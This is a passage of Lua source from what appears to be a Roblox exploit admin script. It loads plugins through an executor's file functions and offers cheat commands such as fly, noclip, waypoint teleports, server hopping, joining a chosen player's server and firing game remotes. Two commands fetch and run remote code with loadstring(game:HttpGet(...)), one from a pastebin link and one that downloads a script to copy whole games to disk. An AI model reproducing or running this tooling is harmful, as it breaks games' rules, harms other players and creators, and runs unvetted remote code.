			pcall(function() file = readfile(name) end)
			fileName = name
		else
			pcall(function() file = readfile(name..'.iy') end)
			fileName = name..'.iy'
		end
		if file then
			if not FindInTable(PluginsTable, fileName) then
				table.insert(PluginsTable, fileName)
				LoadPlugin(fileName)
				refreshplugins()
				pcall(eventEditor.Refresh)
			else
				notify('Plugin Error','This plugin is already added')
			end
		else
			notify('Plugin Error','Cannot locate file "'..fileName..'". Is the file in the correct folder?')
		end
	end
end

function deletePlugin(name)
	local pName = name..'.iy'
	if name:sub(-3) == '.iy' then
		pName = name
	end
	for i = #cmds,1,-1 do
		if cmds[i].PLUGIN == pName then
			table.remove(cmds, i)
		end
	end
	for i,v in pairs(CMDsF:GetChildren()) do
		if v.Name == 'PLUGIN_'..pName then
			v:Destroy()
		end
	end
	for i,v in pairs(PluginsTable) do
		if v == pName then
			table.remove(PluginsTable, i)
			notify('Removed Plugin',pName..' was removed')
		end
	end
	IndexContents('',true)
	refreshplugins()
end

function refreshplugins(dontSave)
	if #PluginsTable > 0 then
		PluginsHint:Destroy()
	end
	if Holder_5 then
		Holder_5:ClearAllChildren()
		Holder_5.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i,v in pairs(PluginsTable) do
			local pName = v
			local YSize = 25
			local Position = ((i * YSize) - YSize)
			local newplugin = Example_5:Clone()
			newplugin.Parent = Holder_5
			newplugin.Visible = true
			newplugin.Position = UDim2.new(0,0,0, Position + 5)
			newplugin.Text.Text = pName
			table.insert(shade2,newplugin)
			table.insert(shade2,newplugin.Text)
			table.insert(text1,newplugin.Text)
			table.insert(shade3,newplugin.Text.Delete)
			table.insert(text2,newplugin.Text.Delete)
			Holder_5.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newplugin.Text.Delete.MouseButton1Click:Connect(function()
				deletePlugin(pName)
			end)
		end
		if not dontSave then
			updatesaves()
		end
	end
end

local PluginCache
function LoadPlugin(val,startup)
	local plugin

	function CatchedPluginLoad()
		plugin = loadfile(val)()
	end

	function handlePluginError(plerror)
		notify('Plugin Error','An error occurred with the plugin, "'..val..'" and it could not be loaded')
		if FindInTable(PluginsTable,val) then
			for i,v in pairs(PluginsTable) do
				if v == val then
					table.remove(PluginsTable,i)
				end
			end
		end
		updatesaves()

		print("Original Error: "..tostring(plerror))
		print("Plugin Error, stack traceback: "..tostring(debug.traceback()))

		plugin = nil

		return false
	end

	xpcall(CatchedPluginLoad, handlePluginError)

	if plugin ~= nil then
		if not startup then
			notify('Loaded Plugin',"Name: "..plugin["PluginName"].."\n".."Description: "..plugin["PluginDescription"])
		end
		addcmdtext('',val)
		addcmdtext(string.upper('--'..plugin["PluginName"]),val,plugin["PluginDescription"])
		for i,v in pairs(plugin["Commands"]) do 
			local cmdExt = ''
			local cmdName = i
			local function handleNames()
				cmdName = i
				if findCmd(cmdName..cmdExt) then
					if isNumber(cmdExt) then
						cmdExt = cmdExt+1
					else
						cmdExt = 1
					end
					handleNames()
				else
					cmdName = cmdName..cmdExt
				end
			end
			handleNames()
			addcmd(cmdName, v["Aliases"], v["Function"], val)
			if v["ListName"] then
				local newName = v.ListName
				local cmdNames = {i,unpack(v.Aliases)}
				for i,v in pairs(cmdNames) do
					newName = newName:gsub(v,v..cmdExt)
				end
				addcmdtext(newName,val,v["Description"])
			else
				addcmdtext(cmdName,val,v["Description"])
			end
		end
		IndexContents('',true)
	elseif plugin == nil then
		plugin = nil
	end
end

function FindPlugins()
	if PluginsTable ~= nil and type(PluginsTable) == "table" then
		for i,v in pairs(PluginsTable) do
			LoadPlugin(v,true)
		end
		refreshplugins(true)
	end
end

AddPlugin.MouseButton1Click:Connect(function()
	addPlugin(PluginsGUI.FileName.Text)
end)

Exit_3.MouseButton1Click:Connect(function()
	PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
	FileName.Text = 'Plugin File Name'
end)

Add_3.MouseButton1Click:Connect(function()
	PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, 310), "InOut", "Quart", 0.5, true, nil)
end)

Plugins.MouseButton1Click:Connect(function()
	if writefileExploit() then
		PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	else
		notify('Incompatible Exploit','Your exploit is unable to use plugins (missing read/writefile)')
	end
end)

Close_4.MouseButton1Click:Connect(function()
	SettingsHolder.Visible = true
	PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

addcmd('addalias',{},function(args, speaker)
	if #args < 2 then return end
	local cmd = string.lower(args[1])
	local alias = string.lower(args[2])
	for i,v in pairs(cmds) do
		if v.NAME:lower()==cmd or FindInTable(v.ALIAS,cmd) then
			customAlias[alias] = v
			aliases[#aliases + 1] = {CMD = cmd, ALIAS = alias}
			notify('Aliases Modified',"Added "..alias.." as an alias to "..cmd)
			updatesaves()
			refreshaliases()
			break
		end
	end
end)

addcmd('removealias',{},function(args, speaker)
	if #args < 1 then return end
	local alias = string.lower(args[1])
	if customAlias[alias] then
		local cmd = customAlias[alias].NAME
		customAlias[alias] = nil
		for i = #aliases,1,-1 do
			if aliases[i].ALIAS == tostring(alias) then
				table.remove(aliases, i)
			end
		end
		notify('Aliases Modified',"Removed the alias "..alias.." from "..cmd)
		updatesaves()
		refreshaliases()
	end
end)

addcmd('clraliases',{},function(args, speaker)
	customAlias = {}
	aliases = {}
	notify('Aliases Modified','Removed all aliases')
	updatesaves()
	refreshaliases()
end)

addcmd('antitimestop',{'ats'},function(args, speaker)
for i = 0,1000000 do
    wait(1)
game.ReplicatedStorage.Main.Remotes.Anchor:FireServer(false)      
end
end)

addcmd('jobid',{},function(args, speaker)
	local jobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
	toClipboard(jobId)
end)

addcmd('notifyjobid',{},function(args, speaker)
	notify('JobId / PlaceId',game.JobId..' / '..game.PlaceId)
end)

addcmd('timestop',{'ts'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/5qnUkTcN"))()
end)

addcmd('gametp',{'gameteleport'},function(args, speaker)
	game:GetService('TeleportService'):Teleport(args[1])
end)

addcmd('rejoin',{'rj'},function(args, speaker)
	if #Players:GetPlayers() <= 1 then
		Players.LocalPlayer:Kick("\nRejoining...")
		wait()
		game:GetService('TeleportService'):Teleport(game.PlaceId, Players.LocalPlayer)
	else
		game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)
	end
end)

addcmd('autorejoin',{'autorj'},function(args, speaker)
	local Dir = COREGUI:FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
	Dir.DescendantAdded:Connect(function(Err)
		if Err.Name == "ErrorTitle" then
			Err:GetPropertyChangedSignal("Text"):Connect(function()
				if Err.Text:sub(0, 12) == "Disconnected" then
					if #game.Players:GetPlayers() <= 1 then
						game.Players.LocalPlayer:Kick("\nRejoining...")
						wait()
						game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
					else
						game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
					end
				end
			end)
		end
	end)
	notify('Auto Rejoin','Auto rejoin enabled')
end)

addcmd('serverhop',{'shop'},function(args, speaker)
	local x = {}
	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
	if #x > 0 then
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
	else
		return notify("Serverhop","Couldn't find a server.")
	end
end)

addcmd('joinplayer',{'joinp'},function(args, speaker)
	local retries = 0
	function ToServer(User,PlaceId)	
		if args[2] == nil then PlaceId = game.PlaceId end
		if not pcall(function()
				local FoundUser, UserId = pcall(function()
					if tonumber(User) then
						return tonumber(User)
					end

					return Players:GetUserIdFromNameAsync(User)
				end)
				if not FoundUser then
					notify('Join Error','Username/UserID does not exist')
				else
					notify('Join Player','Loading servers. Hold on a second.')
					local URL2 = ("https://games.roblox.com/v1/games/"..PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
					local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet(URL2))
					local GUID

					function tablelength(T)
						local count = 0
						for _ in pairs(T) do count = count + 1 end
						return count
					end

					for i=1,tonumber(tablelength(Http.data)) do
						for j,k in pairs(Http.data[i].playerIds) do
							if k == UserId then
								GUID = Http.data[i].id
							end
						end
					end

					if GUID ~= nil then
						notify('Join Player','Joining '..User)
						game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceId,GUID,game.Players.LocalPlayer)
					else
						notify('Join Error','Unable to join user.')
					end
				end
			end)
		then
			if retries < 3 then
				retries = retries + 1
				print('ERROR retrying '..retries..'/3')
				notify('Join Error','Error while trying to join. Retrying '..retries..'/3.')
				ToServer(User,PlaceId)
			else
				notify('Join Error','Error while trying to join.')
			end
		end
	end
	ToServer(args[1],args[2])
end)

addcmd('exit',{},function(args, speaker)
	game:shutdown() 
end)

local Noclipping = nil
addcmd('nc',{'noclip'},function(args, speaker)
	Clip = false
	wait(0.1)
	local function NoclipLoop()
		if Clip == false and speaker.Character ~= nil then
			for _, child in pairs(speaker.Character:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
					child.CanCollide = false
				end
			end
		end
	end
	Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
	if args[1] and args[1] == 'nonotify' then return end
	notify('Noclip','Noclip Enabled')
end)

addcmd('c',{'clip'},function(args, speaker)
	if Noclipping then
		Noclipping:Disconnect()
	end
	Clip = true
	if args[1] and args[1] == 'nonotify' then return end
	notify('Noclip','Noclip Disabled')
end)

addcmd('togglenoclip',{},function(args, speaker)
	if Clip then
		execCmd('noclip')
	else
		execCmd('clip')
	end
end)

FLYING = false
QEfly = true
iyflyspeed = 1
vehicleflyspeed = 1
function sFLY(vfly)
	repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid')
	repeat wait() until IYMouse
	if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end

	local T = getRoot(Players.LocalPlayer.Character)
	local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local SPEED = 0

	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro')
		local BV = Instance.new('BodyVelocity')
		BG.P = 9e4
		BG.Parent = T
		BV.Parent = T
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
			repeat wait()
				if not vfly and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
					Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
				end
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0, 0)
				end
				BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			SPEED = 0
			BG:Destroy()
			BV:Destroy()
			if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
				Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
			end
		end)
	end
	flyKeyDown = IYMouse.KeyDown:Connect(function(KEY)
		if KEY:lower() == 'w' then
			if vfly then
				CONTROL.F = vehicleflyspeed
			else
				CONTROL.F = iyflyspeed
			end
		elseif KEY:lower() == 's' then
			if vfly then
				CONTROL.B = - vehicleflyspeed
			else
				CONTROL.B = - iyflyspeed
			end
		elseif KEY:lower() == 'a' then
			if vfly then
				CONTROL.L = - vehicleflyspeed
			else
				CONTROL.L = - iyflyspeed
			end
		elseif KEY:lower() == 'd' then 
			if vfly then
				CONTROL.R = vehicleflyspeed
			else
				CONTROL.R = iyflyspeed
			end
		elseif QEfly and KEY:lower() == 'e' then
			if vfly then
				CONTROL.Q = vehicleflyspeed*2
			else
				CONTROL.Q = iyflyspeed*2
			end
		elseif QEfly and KEY:lower() == 'q' then
			if vfly then
				CONTROL.E = -vehicleflyspeed*2
			else
				CONTROL.E = -iyflyspeed*2
			end
		end
	end)
	flyKeyUp = IYMouse.KeyUp:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		elseif KEY:lower() == 'e' then
			CONTROL.Q = 0
		elseif KEY:lower() == 'q' then
			CONTROL.E = 0
		end
	end)
	FLY()
end

function NOFLY()
	FLYING = false
	if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
	if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
		Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
	end
end

addcmd('fly',{},function(args, speaker)
	NOFLY()
	wait()
	sFLY()
end)

addcmd('fs',{},function(args, speaker)
	local speed = args[1] or 1
	if isNumber(speed) then
		iyflyspeed = speed
	end
end)

addcmd('unfly',{'nofly','novfly','unvehiclefly','novehiclefly','unvfly'},function(args, speaker)
	NOFLY()
end)

addcmd('vfly',{'vehiclefly'},function(args, speaker)
	NOFLY()
	wait()
	sFLY(true)
end)

addcmd('togglevfly',{},function(args, speaker)
	if FLYING then
		NOFLY()
	else
		sFLY(true)
	end
end)

addcmd('vflyspeed',{'vflysp','vehicleflyspeed','vehicleflysp'},function(args, speaker)
	local speed = args[1] or 1
	if isNumber(speed) then
		vehicleflyspeed = speed
	end
end)

addcmd('qefly',{'flyqe'},function(args, speaker)
	if args[1] == 'false' then
		QEfly = false
	else
		QEfly = true
	end
end)

addcmd('togglefly',{},function(args, speaker)
	if FLYING then
		NOFLY()
	else
		sFLY()
	end
end)

Floating = false
floatName = randomString()
addcmd('float', {'platform'},function(args, speaker)
	Floating = true
	local pchar = speaker.Character
	if pchar and not pchar:FindFirstChild(floatName) then
		spawn(function()
			local Float = Instance.new('Part')
			Float.Name = floatName
			Float.Parent = pchar
			Float.Transparency = 1
			Float.Size = Vector3.new(6,1,6)
			Float.Anchored = true
			local FloatValue = -3.5
			if r15(speaker) then FloatValue = -3.65 end
			Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
			notify('Float','Float Enabled (Q = down & E = up)')
			qUp = IYMouse.KeyUp:Connect(function(KEY)
				if KEY == 'q' then
					FloatValue = FloatValue + 0.5
				end
			end)
			eUp = IYMouse.KeyUp:Connect(function(KEY)
				if KEY == 'e' then
					FloatValue = FloatValue - 0.5
				end
			end)
			qDown = IYMouse.KeyDown:Connect(function(KEY)
				if KEY == 'q' then
					FloatValue = FloatValue - 0.5
				end
			end)
			eDown = IYMouse.KeyDown:Connect(function(KEY)
				if KEY == 'e' then
					FloatValue = FloatValue + 0.5
				end
			end)
			floatDied = speaker.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
				FloatingFunc:Disconnect()
				Float:Destroy()
				qUp:Disconnect()
				eUp:Disconnect()
				qDown:Disconnect()
				eDown:Disconnect()
				floatDied:Disconnect()
			end)
			local function FloatPadLoop()
				if pchar:FindFirstChild(floatName) and getRoot(pchar) then
					Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
				else
					FloatingFunc:Disconnect()
					Float:Destroy()
					qUp:Disconnect()
					eUp:Disconnect()
					qDown:Disconnect()
					eDown:Disconnect()
					floatDied:Disconnect()
				end
			end			
			FloatingFunc = game:GetService('RunService').Heartbeat:Connect(FloatPadLoop)
		end)
	end
end)

addcmd('unfloat',{'nofloat','unplatform','noplatform'},function(args, speaker)
	Floating = false
	local pchar = speaker.Character
	notify('Float','Float Disabled')
	if pchar:FindFirstChild(floatName) then
		pchar:FindFirstChild(floatName):Destroy()
	end
	if floatDied then
		FloatingFunc:Disconnect()
		qUp:Disconnect()
		eUp:Disconnect()
		qDown:Disconnect()
		eDown:Disconnect()
		floatDied:Disconnect()
	end
end)

addcmd('togglefloat',{},function(args, speaker)
	if Floating then
		execCmd('unfloat')
	else
		execCmd('float')
	end
end)

swimming = false
addcmd('swim',{},function(args, speaker)
	workspace.Gravity = 0
	local function swimDied()
		workspace.Gravity = 198.2
		swimming = false
	end
	gravReset = speaker.Character:FindFirstChildOfClass('Humanoid').Died:Connect(swimDied)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
	speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	swimming = true
end)

addcmd('unswim',{'noswim'},function(args, speaker)
	workspace.Gravity = 198.2
	swimming = false
	if gravReset then
		gravReset:Disconnect()
	end
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
	speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
	speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
end)

addcmd('toggleswim',{},function(args, speaker)
	if swimming then
		execCmd('unswim')
	else
		execCmd('swim')
	end
end)

addcmd('mark',{'m','swp','spos','saveposition','savepos'},function(args, speaker)
	local WPName = tostring(getstring(1))
	if getRoot(speaker.Character) then
		notify('Modified Waypoints',"Created waypoint: "..getstring(1))
		local torso = getRoot(speaker.Character)
		WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}, GAME = game.PlaceId}
		if AllWaypoints ~= nil then
			AllWaypoints[#AllWaypoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}, GAME = game.PlaceId}
		end
	end	
	refreshwaypoints()
	updatesaves()
end)

addcmd('waypoint',{'wpp','setwaypointposition','setpos','setwaypoint','setwaypointpos'},function(args, speaker)
	local WPName = tostring(getstring(1))
	if getRoot(speaker.Character) then
		notify('Modified Waypoints',"Created waypoint: "..getstring(1))
		WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {args[2], args[3], args[4]}, GAME = game.PlaceId}
		if AllWaypoints ~= nil then
			AllWaypoints[#AllWaypoints + 1] = {NAME = WPName, COORD = {args[2], args[3], args[4]}, GAME = game.PlaceId}
		end
	end	
	refreshwaypoints()
	updatesaves()
end)

waypointParts = {}
addcmd('s',{'showwp','showwps'},function(args, speaker)
	execCmd('hidewaypoints')
	wait()
	for i,_ in pairs(WayPoints) do
		local x = WayPoints[i].COORD[1]
		local y = WayPoints[i].COORD[2]
		local z = WayPoints[i].COORD[3]
		local part = Instance.new("Part")
		part.Size = Vector3.new(5,5,5)
		part.CFrame = CFrame.new(x,y,z)
		part.Parent = workspace
		part.Anchored = true
		part.CanCollide = false
		table.insert(waypointParts,part)
		local view = Instance.new("BoxHandleAdornment")
		view.Adornee = part
		view.AlwaysOnTop = true
		view.ZIndex = 10
		view.Size = part.Size
		view.Parent = part
	end
	for i,v in pairs(pWayPoints) do
		local view = Instance.new("BoxHandleAdornment")
		view.Adornee = pWayPoints[i].COORD[1]
		view.AlwaysOnTop = true
		view.ZIndex = 10
		view.Size = pWayPoints[i].COORD[1].Size
		view.Parent = pWayPoints[i].COORD[1]
		table.insert(waypointParts,view)
	end
end)

addcmd('hidewaypoints',{'hidemarks','h'},function(args, speaker)
	for i,v in pairs(waypointParts) do
		v:Destroy()
	end
	waypointParts = {}
end)

addcmd('/',{'goto','lpos','loadposition','loadpos'},function(args, speaker)
	local WPName = tostring(getstring(1))
	if speaker.Character then
		for i,_ in pairs(WayPoints) do
			if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				getRoot(speaker.Character).CFrame = CFrame.new(x,y,z)
			end
		end
		for i,_ in pairs(pWayPoints) do
			if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
				getRoot(speaker.Character).CFrame = CFrame.new(pWayPoints[i].COORD[1].Position)
			end
		end
	end
end)

tweenSpeed = 1
addcmd('tweenspeed',{'tspeed'},function(args, speaker)
	local newSpeed = args[1] or 1
	if tonumber(newSpeed) then
		tweenSpeed = tonumber(newSpeed)
	end
end)

addcmd('tweenwaypoint',{'twp'},function(args, speaker)
	local WPName = tostring(getstring(1))
	if speaker.Character then
		for i,_ in pairs(WayPoints) do
			local x = WayPoints[i].COORD[1]
			local y = WayPoints[i].COORD[2]
			local z = WayPoints[i].COORD[3]
			if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
				game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(x,y,z)}):Play()
			end
		end
		for i,_ in pairs(pWayPoints) do
			if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
				game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(pWayPoints[i].COORD[1].Position)}):Play()
			end
		end
	end
end)

addcmd('deletewaypoint',{'d','dpos','deleteposition','deletepos'},function(args, speaker)
	for i,v in pairs(WayPoints) do
		if v.NAME:lower() == tostring(getstring(1)):lower() then
			notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
			table.remove(WayPoints, i)
		end
	end
	if AllWaypoints ~= nil and #AllWaypoints > 0 then
		for i,v in pairs(AllWaypoints) do
			if v.NAME:lower() == tostring(getstring(1)):lower() then
				if not v.GAME or v.GAME == game.PlaceId then
					table.remove(AllWaypoints, i)
				end
			end
		end
	end
	for i,v in pairs(pWayPoints) do
		if v.NAME:lower() == tostring(getstring(1)):lower() then
			notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
			table.remove(pWayPoints, i)
		end
	end
	refreshwaypoints()
	updatesaves()
end)

addcmd('clearwaypoints',{'cwp','clearpositions','cpos','clearpos'},function(args, speaker)
	WayPoints = {}
	pWayPoints = {}
	refreshwaypoints()
	updatesaves()
	AllWaypoints = {}
	notify('Modified Waypoints','Removed all waypoints')
end)

addcmd('enable',{},function(args, speaker)
	if args[1]:lower() == 'inventory' or args[1]:lower() == 'backpack' then
		game:GetService("StarterGui"):SetCoreGuiEnabled('Backpack', true)
	elseif args[1]:lower() == 'playerlist' then
		game:GetService("StarterGui"):SetCoreGuiEnabled('PlayerList', true)
	elseif args[1]:lower() == 'chat' then
		game:GetService("StarterGui"):SetCoreGuiEnabled('Chat', true)
	elseif args[1]:lower() == 'all' then
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
	end
end)

addcmd('disable',{},function(args, speaker)
	if args[1]:lower() == 'inventory' or args[1]:lower() == 'backpack' then
		game:GetService("StarterGui"):SetCoreGuiEnabled('Backpack', false)
	elseif args[1]:lower() == 'playerlist' then
		game:GetService("StarterGui"):SetCoreGuiEnabled('PlayerList', false)
	elseif args[1]:lower() == 'chat' then
		game:GetService("StarterGui"):SetCoreGuiEnabled('Chat', false)
	elseif args[1]:lower() == 'all' then
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
	end
end)

local invisGUIS = {}
addcmd('showguis',{},function(args, speaker)
	for i,v in pairs(speaker:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
		if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and not v.Visible then
			v.Visible = true
			if not FindInTable(invisGUIS,v) then
				table.insert(invisGUIS,v)
			end
		end
	end
end)

addcmd('unshowguis',{},function(args, speaker)
	for i,v in pairs(invisGUIS) do
		v.Visible = false
	end
	invisGUIS = {}
end)

local hiddenGUIS = {}
addcmd('hideguis',{},function(args, speaker)
	for i,v in pairs(speaker:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
		if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and v.Visible then
			v.Visible = false
			if not FindInTable(hiddenGUIS,v) then
				table.insert(hiddenGUIS,v)
			end
		end
	end
end)

addcmd('unhideguis',{},function(args, speaker)
	for i,v in pairs(hiddenGUIS) do
		v.Visible = true
	end
	hiddenGUIS = {}
end)

local wasStayOpen = StayOpen
addcmd('hide',{},function(args, speaker)
	wasStayOpen = StayOpen
	if StayOpen == true then StayOpen = false
		On.BackgroundTransparency = 1
	end
	minimizeNum = 0
	minimizeHolder()
end)

addcmd('show',{},function(args, speaker)
	minimizeNum = -20
	if wasStayOpen then
		maximizeHolder()
		StayOpen = true
		On.BackgroundTransparency = 0
	else
		minimizeHolder()
	end
end)

addcmd('savegame',{'saveplace'},function(args, speaker)
	if syn_checkcaller then
		notify("Loading","Fetching Moon's SaveInstance")
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/saveinstance/master/source'))()
		repeat wait() until saveplace
		notify("Loading","Downloading game. This will take a while")
		local placeName = tostring(game.PlaceId).." Map"
		saveplace(tostring(game.PlaceId).." Map")
		wait(1)
		notify('Game Saved','Saved place to the workspace folder within your exploit folder.')
	elseif saveinstance then
		notify("Loading","Downloading game. This will take a while")
		saveinstance()
		notify('Game Saved','Saved place to the workspace folder within your exploit folder.')
	else
